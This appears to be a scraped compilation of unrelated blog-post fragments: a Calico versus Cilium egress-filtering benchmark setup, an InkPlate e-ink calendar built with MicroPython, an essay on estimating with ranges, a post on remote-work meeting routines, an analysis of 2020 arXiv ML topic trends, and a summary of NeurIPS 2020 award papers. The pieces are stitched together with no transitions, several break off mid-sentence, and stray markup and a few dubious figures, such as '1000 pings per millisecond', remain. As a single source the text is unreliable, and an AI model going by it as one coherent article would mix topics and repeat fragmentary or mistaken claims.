<div><pre><code data-lang="shell">c2.medium.x86
1x AMD EPYC 7401P 24-Core Processor @ 2.0GHz
2x 120GB SSD
2x 480GB SSD
64GB RAM
2x 10Gbps
</code></pre></div><h3 id="software">Software</h3>
<p>Kubernetes is deployed using 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
. We used two separate
clusters for this benchmark, to isolate comparison of Calico and Cilium from interfering with each other.</p>
<h4 id="calico">Calico</h4>
<p>Calico offers a choice of dataplane options, including standard Linux networking (its default) and eBPF.
However, Calico’s eBPF dataplane doesn’t support host endpoints, which means that node-level egress filtering
is not possible with it. Hence, we use the default standard Linux networking dataplane for our tests.</p>
<h4 id="cilium">Cilium</h4>
<p>Cilium with its eBPF based dataplane is installed on Lokomotive using a 


<a href="https://github.com/kinvolk/lokomotive/blob/imran/cilium-instead-of-calico/assets/terraform-modules/bootkube/resources/charts/cilium.yaml" target="_blank">modified default
configuration</a>

to support our test scenario. The changes are as follows:</p>
<ul>
<li>Increase the number of entries in the endpoint policy map to the maximum limit allowed; i.e. 65536.</li>
<li>Enable host firewall for enforcing host network policies.</li>
<li>The network interface name on which the host firewall applies.</li>
</ul>
<h4 id="software-versions">Software Versions</h4>
<p>The exact versions of all the tools we used are:</p>
<ul>
<li>Flatcar Container Linux by Kinvolk Alpha (2705.0.0)</li>
<li>Linux kernel 5.9.11</li>
<li>iperf 3.6 (in a Docker container with the host network)</li>
<li>iptables v1.6.2</li>
<li>ipset v7.6, protocol version: 7</li>
<li>Lokomotive v0.5.0 for Calico; Cilium feature branch for installing Lokomotive with Cilium</li>
<li>Kubernetes v1.19.4</li>
<li>Calico v3.16.4</li>
<li>Cilium v1.9.0</li>
</ul>
<p>A minimal working configuration for deploying Lokomotive on Equinix Metal can be found



<a href="https://github.com/kinvolk/egress-filtering-benchmark/blob/master/lokomotive" target="_blank">here</a>
 and the
instructions are mentioned in the



<a href="https://github.com/kinvolk/egress-filtering-benchmark/blob/master/README.md" target="_blank">README.md</a>
.</p>
<h3 id="tests">Tests</h3>
<p>We used the following parameters for each of the tests:</p>
<ul>
<li>
<p>Throughput: The goal of this test is to maximize throughput, ignoring CPU consumption (i.e. CPU will
typically be saturated). Therefore, iperf3 was used with the bandwidth set to 10Gbps (equal to the network
interface adapter speed) and UDP Packet size set to 1470. Throughput is tested in Gbps; we have not measured
throughput in packet per second (pps) but that could be added in the benchmark framework
(see 


<a href="https://github.com/kinvolk/egress-filtering-benchmark/issues/16" target="_blank">issue #16</a>
).</p>
</li>
<li>
<p>CPU usage: In this test we want to see the variation in CPU usage for a given throughout. Therefore, we
again use iperf3 but reduce the bandwidth to 1G. UDP Packet size remains at 1470.</p>
</li>
<li>
<p>Latency: To test latency, we bombard the server with ICMP packets using the ping utility at a rate of 1000
pings per millisecond.</p>
</li>
<li>
<p>Setup Time: As we discussed in our first egress filtering benchmark, set-up time is an implementation-detail
specific to the benchmarking application and most certainly can be improved upon. Setup time for Calico and
Cilium is calculated using ‘ping’ (ICMP) on a polling basis, checking the enforcement of policies on each
poll.</p>
</li>
</ul>
<h3 id="reproducibility">Reproducibility</h3>
<p>All the tools and instructions to reproduce these tests are provided in the GitHub repository



<a href="https://github.com/kinvolk/egress-filtering-benchmark" target="_blank">github.com/kinvolk/egress-filtering-benchmark
</a>
</p>
<h3 id="constraints">Constraints</h3>
<ul>
<li>
<p>To avoid the error <code>etcdserver: Request entity too large</code> multiple NetworkPolicy manifests (for Cilium and
Calico) are created with each containing a maximum of 50000 CIDR entries. When the number of rules increases,
more manifests are created and sent to the Kubernetes API server.</p>
</li>
<li>
<p>One possible source of error in testing is if the Kubernetes API server and etcd themselves become a
bottleneck for requests, especially when a lot of resources are created in a short span of time. since both
Calico and Cilium use them extensively. Therefore, Controller nodes were chosen such that they can …</p></li></ul></div></div>

</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>

<p>We’re constantly asked to give estimates:</p>



<p><em>How long will it take?<br>How much will it cost?</em><br><em>What time should we leave?</em><br><em>How much do you want?</em></p>



<p>Estimations are information about the unknown. We constantly use this information to make decisions: allocating resources, changing strategies, and choosing partners. But despite all this practice, we’re horrible at accurate estimations.</p>



<h2>Why Estimations are Hard</h2>



<p>Estimations are hard for both technical and social reasons.</p>



<p>We don’t know what we don’t know. Naive estimators fail to account for surprises. They estimate based on known factors and best-case scenarios. These estimates may be <em>perfectly accurate</em> beforehand, but they’re instantly broken by the first surprise.</p>



<p>Experienced estimators account for this problem by ‘adding some buffer’. But even then, how much should they add? Even knowing that surprises <em>can</em> happen, it’s impossible to <em>how many</em> will happen or <em>the impact</em> of those surprises. Choosing the right amount of buffer is a lot like making the right estimation in the first place. We still don’t know what we don’t know. And adding too much buffer can be as expensive as failing to account for surprise at all.</p>



<p>In addition to this technical problem, there’s a strong social problem. Let’s imagine two common scenarios.</p>



<p>In the first scenario, you just gave  giving an estimate to your team. You perfectly estimate that a project will take three weeks; but your manager gives you a puzzled look. Your teammate snickers, claiming they could do it in a week, tops. The feeling is that you must be either lazy or incompetent to give such a padded estimation. You newly shortened estimate is wrong, so you go on to extend the project’s deadline twice in three weeks. Rather than holding you accountable to that one-week estimate, your manager commends you for being able to handle the unforeseen surprises on such a complicated project.</p>



<p>In the other scenario, you’re giving an estimate to a potential client. You perfectly estimate that a project will take three weeks; but your competitor only estimates it’ll take a week. The client signs with your competitor. Since their estimate was wrong, your competitor goes on to extend the deadline twice in three weeks. Even though your estimate was accurate, your client’s estimate got them paid.</p>



<p>I’ve been in countless scenarios like this. Sometimes people outright pressure us into shortening our estimations, and sometimes the voice in our heads push us to. Either way, giving accurate estimates is both technically hard and socially challenging [1].</p>



<h2>Two Types of Estimators</h2>



<p>In response to this hard problem, we become systematic underestimators or systematic overestimators.</p>



<p>Underestimators fail to give enough buffer. This strategy has two key benefits. First, it signals (unrealistically) high performance. Like our virtue-signalling teammate, we can underestimate ahead of time, then point at concrete surprises for our eventual underperformance. And like our overpromising competitor, we can underestimate during a bid and do whatever we want after the contract is signed. Second, tight estimates demand efficiency. Underestimators set deadlines that they and their teams must work hard to meet. Underestimation works well when the costs of going over-budget are small. But when those costs are large, underestimations lead to disasters. On the whole, underestimators systematically run the risk of being burnt out, past-deadline, and over-budget.</p>



<p>Overestimators are instead biased towards large buffers. Extreme overestimators might send you articles titled “Estimations are a Scam”, or claim that estimations are simply tools for worker exploitation. Overestimation works when the costs of buffer are low and the costs of going over budget are high. But overestimators are constantly taxed by Parkinson’s Law. Parkinson’s Law is the pattern where projects fill the time and resources they’re allocated, instead of the time and resources they need [2]. Rather than pushing towards peak performance, overestimators systematically move at a bored, leisurely pace. Overestimators are also demotivating. Rather than inspiring the team to reach competitive goals, they disparage those who do. So while underestimators run the risk of their teams burning out, overestimators run the risk of their teams shutting down.</p>



<p>To simplify the hard problem of estimations, we slowly become under- or over-estimators. We reap the systematic rewards and accept the systematic costs. These chosen strategies may work in many contexts. But for any simple strategy, there are worst-case scenarios where those systematic risks blow up. Underestimators blow up when the costs of going over budget skyrocket. Overestimators blow up when the costs of adding extra buffer skyrocket.</p>



<p>This line between underestimators and overestimators forms a classic “spectrum problem”. A spectrum problem occurs when we oversimplify the solution to a given tradeoff. In this case, we’re splitting the spectrum of estimation strategies in half. Underestimators fall on one side of the line, and overestimators fall on the other. With many spectrum problems, the better solution is to cut the spectrum into three pieces, choosing the middle strategy between extremes. In doing so, we acknowledge the costs and rewards of both sides, maximizing the upsides and minimizing the downsides systematically.</p>



<h2>Playing Single-Pointed Darts</h2>



<p>Imagine a game of darts with very simple rules. I throw my dart first, and you only score by hitting that same exact dart-sized point. This game is very simple, but so difficult that nobody would play it. To make darts playable, we specify scoring <em>ranges</em>. These same ranges are missing from our everyday estimations.</p>



<p>The most common estimate sounds something like: “I’ll have it ready by 5pm.” But this is just like playing single-point darts! Imagine that this estimate is perfectly precise: the project can’t be ready one second before or one second after 5pm. While impressive, there’s zero room for error. If we end up sick, or if the project ends up more complex than expected, our estimate becomes instantly wrong.</p>



<p>To account for surprises, we can add buffer. But adding buffer only shifts the dart board over a few inches. “I’ll have it ready by 5pm <em>tomorrow</em>” faces all the same problems as the first estimation. Two days of surprises still makes me wrong. We’re still playing single-pointed darts.</p>



<p>It’s a losing game. And yet we see it played again and again, day after day, project after project.</p>



<h2>Playing Darts with Ranges</h2>



<p>To enjoy this game of darts, we need to change the rules. Rather than giving a single-pointed estimate, we give two points: one for the best case, and one for the worst case. These two points create a range of targets to hit, just like the game of darts we know and love.</p>



<p>To demonstrate, I can give an example from my personal life. My girlfriend is very punctual, and I’m not. She’s a classic overestimator, giving as much buffer as we can afford. And I’m a classic underestimator, giving the most optimistic estimates. So whenever we have somewhere to be, and she asks me “what time should we be ready?”… it’s a classic estimation problem!</p>



<p>My preference would be to underestimate, and tell her the last minute we can leave without being late. Her preference would be for me to overestimate, telling her the soonest we can leave without being “too early”. But no matter what I say, we face all of the same problems stated above.</p>



<p>Recently, I’ve started giving her two answers. The first answer is “the green time”. <strong>The green time tells us when we should leave so that we’re pleasantly early</strong>. The second answer is “the red time”. <strong>The red time is the last minute we can leave, without definitely being late</strong>. If we can be ready by the green time without stress or shortcuts, that’s perfect. Once we pass the green time, we go into the “yellow zone.” <strong>The yellow zone is the buffer between early and late</strong>. There’s no need to take shortcuts or change plans yet, but we’re getting close. Once we approach the red line, we start discussing the need to take shortcuts, or to start telling others that we may be a little late.</p>



<p>Having a green time, a yellow zone, and a red time transforms our game of single-pointed darts into a proper dartboard, with zones of success. The green time makes my girlfriend happy: she can be ready early without worry. The red time makes me happy: I can fill my buffer time up with other activities. And the yellow zone is a signal for both of us to get focused or to start taking shortcuts [3].</p>



<p>Aside from the technical benefits, I can <em>feel</em> the difference in enjoyment between playing single-pointed darts vs playing scoring-ranged darts. Having a range makes inherent uncertainty explicit to the group. Adding buffer doesn’t just shift the dartboard a few inches, it expands our range of accuracy. Larger buffers signal more uncertainty and require less precision, while smaller buffers signal more confidence and require more precision. The expression of certainty and confidence isn’t possible to communicate with a single-pointed estimate.</p>



<p>By estimating with two numbers instead of one, a richness of information and strategies are made available.</p>



<h2>Simple Changes</h2>



<p>Using two numbers instead of one, these so-called “confidence intervals” aren’t complicated. Then why are they so absent from everyday life?</p>



<p>Although nothing prevented us from discovering them earlier, the first mention of confidence intervals in scientific literature wasn’t until 1937. And it wasn’t until the 1980s that they were required in scientific journals. So if it took forty years for the most knowledgeable people to apply a simple solution towards the most urgent problems, it’s not surprising that it’s taken the rest of us at least as long. That said, the goal of this essay is to speed up that process.</p>



<p>We can move towards accurate estimations by practicing two …</p></div></article></div>

Psychologically and emotionally, it’s easy to feel disconnected and lonely when you don’t see people outside your household for weeks and months on end. And this presents some unique challenges for maintaining culture and productivity, and keeping morale up in general.</p><p><strong>The Challenge</strong></p><p>When the pandemic hit in March and everyone in the world started working remotely, we were worried about how to keep people connected and plugged in. We had to adapt quickly to keep communication flowing and make sure that everyone felt connected and a part of the community that we somewhat lost when everyone stopped going into the office.</p><p>We developed a solution that has worked really well for us, and I’d like to share it. I hope you find it useful, but I’d love to hear if you’ve found other things that work as well.</p><p><strong>The Solution: Monday Morning</strong></p><p>Immediately after switching to full remote work, we switched up the cadence of company meetings. We went from an all hands once a month to two in the same week.</p><p>Every Monday morning at 9:30 we get everyone together (via Zoom) to kick off the week with a company-wide coffee hour.</p><figure><img width="1024" height="577" src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w"><figcaption>Mmm, a cup of coffee together is a great way to kick off the week!</figcaption></figure><p>In this meeting we go team-by-team over what we accomplished last week and our goals are for this week.

Everyone knows what’s happening around the company, including in all of the other teams. Everyone seems to like it, and there are some interesting byproducts:</p><ul><li>Our short-term goal setting has gotten much better. Goals are set on a weekly basis, which has resulted in more accountability and velocity. Teams are looking at goals on a shorter time horizon now, which leads to more tangible outcomes every week.</li><li>Wins and losses come at the end of each and every week, which is very motivating if the team hits their goals, or if the team doesn’t hit their goals. Either way, the entire company sees it.</li><li>We’ve become much better at estimating how long it will take to do something. If you’re bad at estimating it can completely destroy morale and trust, this shorter-term focus has made the act of slicing up work into achievable chunks much more efficient.</li></ul><p><strong>The Solution: Friday Afternoon</strong></p><p>On Friday afternoon there are two more things we do every single week.</p><p>At 1pm, after the leadership team updates the Monday morning deck, we meet as a group to review everyone’s updates together, ask questions, and talk about challenges. Some of the best discussions and collaboration happen during this meeting, and this is the main place and time where cross-team dependencies are often discovered and planned around. We also talk about wins, challenges, and collect shout-outs for people who have done outstanding work over the past week.</p><p>Then at 4:30pm, before everyone takes off for the weekend, we wrap up the week with our Friday Afternoon Happy Hour:</p><figure><img width="1024" height="576" src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w"><figcaption>Not everyone drinks at happy hour, but we do keep it happy!</figcaption></figure><p>We try to keep happy hour fun and lighthearted. We celebrate wins, give shout-outs to people who did something extraordinary over the course of the week, and show the company any fun or funny things that happened during the course of the week. We try to leave some room for people to talk and have fun as well (we’ve had some GREAT Zoom backgrounds!), but generally we try to send people into the weekend on a high note.</p><p><strong>Summary</strong></p><p>These meetings have become routine for us now, and pretty much our entire company loves them. Our communication is better, teamwork is tighter, goal-setting is more accurate, and velocity is way higher.</p><p>Honestly I would have a hard time *not* having these meetings now. They’ve worked *so well* to create a tighter company all around that I don’t know that any set of in-person meetings could really replicate, let alone surpass, the results.</p><p>This may not work for everyone, but it works great for us, and I hope that at the very least this sparks some ideas for making your company more efficient and maintaining your culture during this–or any future–challenge to working together.</p></div></div></div>]]>

                    <!--kg-card-begin: markdown--><p>The progress of the machine learning (ML) and artificial intelligence fields never stopped surprising us this year either. In natural language processing (NLP), new, powerful models such as GPT-3 and T5 are published one after another. The Transformer found its way into the computer vision (CV) field as well (<a href="https://cdn.openai.com/papers/Generative_Pretraining_from_Pixels_V2.pdf">Chen et al. 2020</a>, <a href="https://arxiv.org/abs/2010.11929">Dosovitskiy et al. 2020</a>). The exponential growth trend of the number of papers published on arXiv and at conferences hasn't slowed down yet.</p>
<p>In this post, I'm going to use NLP techniques to analyze all the ML/NLP/CV papers published on arXiv this year and summarize the "most frequently mentioned ML topics in 2020." These top-ranked keywords represent the ML trends in 2020 very well, and knowing them in advance will make your job easier when it comes to reading more scientific articles (this is very important for non-native English speakers like me!)</p>
<p>Specifically, I collected the titles and abstracts of all the papers published on arXiv in 2020 via the arXiv API, and extracted named entities with a model trained on SciREX. The SciREX model can extract typed named entities such as tasks, metrics, datasets, and methods, which enables us to rank the mentions per type. The technical details of the analyses are shown in the "technical details" section at the bottom of this article.</p>
<h2 id="mostfrequentlymentionedtopicsin2020pertype">Most Frequently Mentioned Topics in 2020 (per Type)</h2>
<p>I only focus on the three AI fields—general machine learning (<a href="https://arxiv.org/list/cs.LG/recent">cs.LG</a>), natural language processing (<a href="https://arxiv.org/list/cs.CL/recent">cs.CL</a>), and computer vision (<a href="https://arxiv.org/list/cs.CV/recent">cs.CV</a>). I'm aware that there are many other AI/ML categories on arXiv, although I limited to just three to simplify things.</p>

<p>If you look at the list of datasets, most of them are related to computer vision, which is arguably the most actively researched area in machine learning.</p>
<p>As for the methods, you see neural networks everywhere. Among generic methods such as "neural network" and "deep learning" you also see "graph neural network," which is one of the biggest recent trends in ML.</p>

<p>This was obvious in retrospect, but the most mentioned topic in NLP was "COVID-19." A dataset of COVID-related papers <a href="https://allenai.org/data/cord-19">CORD-19</a> was published. An information extraction shared task was held at the <a href="http://noisy-text.github.io/2020/">W-NUT 2020</a> workshop. A lot of research efforts were made for analyzing COVID-related information on social media as well as on clinical text. It is also nice to see many authors <a href="https://thegradient.pub/the-benderrule-on-naming-the-languages-we-study-and-why-it-matters/">name the language(s)</a> they work on in the abstract.</p>
<p>Top-mentioned methods are all related to BERT, language models, and transformers. I wonder when the <a href="https://ruder.io/nlp-imagenet/">"ImageNet Moment"</a> with transformer-based transfer learning is going to peak out in NLP.</p>

<p>Among the "regulars" such as CIFER-10/100, ImageNet, and MNIST, COVID-19 and chest x-ray are in the most mentioned dataset list. There has been a lot of research work on, for example, diagnosis of COVID-19 from chest x-ray images.</p>
<p>The most mentioned task was (semantic) segmentation, which is an important CV task with a wide range of applications such as autonomous driving and medical image processing.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="topicsontherisein2020">Topics on the Rise in 2020</h2>
<p>In the second half of this article, we are going to dive into some trends of individual fields by comparing the number of mentions between 2019 and 2020 and focusing on mentions that have significantly more (or fewer) mentions.</p>
<h3 id="machinelearningcslg">Machine Learning (cs.LG)</h3>
<p>First, let's look at the mention trends in machine learning. The following table lists the 20 most mentioned topics in 2020 (regardless of their types)  along with their monthly trends (relative number of papers that mention each keyword) in the past 24 months. If a topic has statistically significantly more mentions compared to the expected value based on the 2-year average, the trend is shown in green; red if it's significantly fewer.</p>

</table><!--kg-card-end: html--><!--kg-card-begin: markdown--><p>The table above shows that the actual number of papers mentioning "deep neural network," "convolutional neural network," "generative adversarial network" is significantly smaller than expected.

<p>On the other hand, COVID-19 and graph neural networks are on the rise, as discussed above. The entire field of NLP seems to be on the rise as well, thanks to the continued interests in methods such as transformers and BERT.</p>

<!--kg-card-end: html--><!--kg-card-begin: markdown--><p>BERT, language models, and transformers are among the "hottest" methods in recent years, and their mentions are on the rise in 2020 too. The significantly larger number of "downstream tasks" mentions is most likely due to the continued interests in transfer learning.</p>
<p>On the flip side, "machine translation," "neural machine translation," and "BLEU score" were not mentioned as much. This does not mean these translation-related topics are not important, but does mean that the NLP trends have shifted to pretrained language models after the the "Transformer shock" in 2017 had subsided.</p>
<p>Other mentions that increased significantly in 2020 include "pretrain models," "fine-tuning," and "RoBERTa." The mentions of RoBERTa had increased 6-fold in 2020 compared to the previous year, cementing its position as the baseline pretrained model after BERT.</p>

				<div><p><span>This was one hard, very hard year for all of us</span><span>.&nbsp;It was a year in which pandemic reshaped our world. It seems that this trend is going to go continue further in 2021. The field of AI, however, was not impacted that much by all these changes. At least not in a negative way. A steady flow of research papers was not stopped, in fact, we saw some quite amazing breakthroughs. That is why, for the last article of 2020, we decided to write about </span><strong>awarded </strong><span>research </span><strong>papers </strong><span>from </span><strong>Neural Information Processing Systems</strong><span> (</span><em>NeurIPS</em><span>) conference.</span></p>
<p><span> Looking at the old logo of </span><em>NeurIPS&nbsp;</em><span>conference, my wife asked me “What is that? Is that a witchcraft conference?”. Close, but no, it is one of the most </span><strong>important</strong><span> machine learning conferences. In fact, </span><span>the&nbsp;</span><em>NeurIPS </em><span>awards are something like the </span><em>Oscars </em><span>in the world of machine learning. Every year a bunch of papers is proposed to and the best papers are awarded. This was the thirty-fourth&nbsp;</span><em>NeurIPS </em><span>conference and it was held online. Interesting thing is that this years’ conference had the biggest number of </span><strong>submissions </strong><span>ever. This year 38% more papers were accepted than the last, which is 1,903 as compared to 2019’s 1,428. This says a lot about the state of the machine learning industry.&nbsp;</span></p></div>

<p>From a huge number of submitted papers and 1903 accepted papers – 3 were awarded. This year winning papes are:</p>

<ul>
<li>Language Models are Few-Shot Learners</li>
<li>No-Regret Learning Dynamics for Extensive-Form Correlated Equilibrium</li>
<li>Improved Guarantees and a Multiple-Descent Curve for Column Subset Selection and the Nystrom Method</li>
</ul>

<p>The <em>NeurIPS </em>committee was guided by several <strong>criteria</strong>. The best paper has to be revolutionary, creative and have a certain elegance, but it has feasible, realistic and reproducible as well. It also shouldn’t be over complicated and inefficient. In our opinion committee have done an awesome job 🙂</p>

<p>It is would be a small thing to say that GPT-3 blew us all away this year. We already see so many applications that are utilizing the concepts presented in this paper. In general, we may say that GPT-3 was the biggest disruption we saw this year, so there is no wonder why this paper won at this year’s conference. The background of this fascinating paper, released by researchers from Open AI, lies in the fact that transfer learning is becoming dominant in <strong>NLP</strong>. Meaning that the industry is heavily using models that are pre-trained on a large corpus of text and then fine-tune them on a specific task.</p>
<p><strong>Fine-tuning</strong> itself can be time-consuming. On the other hand, humans can perform a new language task from only a few examples, which is something that NLP models are trying to achieve (even though they are still far away from it). In order to improve that and generate more t<strong>ask agnostic</strong> solution, OpenAI trained <strong>GPT-3</strong> model with <strong>175 billion parameters</strong> and tested its performance without any fine-tuning. As expected, they achieve some amazing results. Just for comparison, last year’s GPT-2 had 1.5 billion parameters and this month Microsoft introduced (until now) the largest Transform based language model that had 17 billion parameters. So, yes, GPT-3 is a huge autoregressive model trained with unsupervised learning and few-shot learning.</p>

				<p>Architecturally speaking, there are no changes from the <strong>GPT-2</strong> model. All the nitty-gritty details like modified initialization, pre-normalization and reversible tokenization are the same. The only <strong>difference</strong> is that that this time authors used alternating dense and locally banded sparse attention patterns in the layers of the transformer. Also, this large GPT-3 model was not the only model that is trained for the purposes of this paper. There are <strong>8 models</strong>, with parameters variating from 125 million to 175 billion parameters:</p>

				<p>In this table, we can also see the sizes of the batches used for model training. These models are trained on following <strong>datasets</strong>:</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=1080&amp;ssl=1" alt="" title="datasetsgpt3" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=480&amp;ssl=1 480w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?resize=300%2C88&amp;ssl=1 300w" sizes="(max-width: 480px) 100vw, 480px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>The results from all the categories are mindblowing. For example, for traditional language modeling tasks, GPT-3 sets a new <strong>SOTA</strong> on the <em>Penn Tree Bank</em> dataset by a margin of 15 points based on zero-shot perplexity. GPT-3 showed amazing results in <em>question answering</em> tests. In general, these tests are separated into open-book and closed-book tests. Due to the number of possible queries, open-book tests use an information retrieval system to find relevant text and then the model learns to generate the answer from the question and retrieved text. Closed-book tests don’t have this retrieval system.</p>

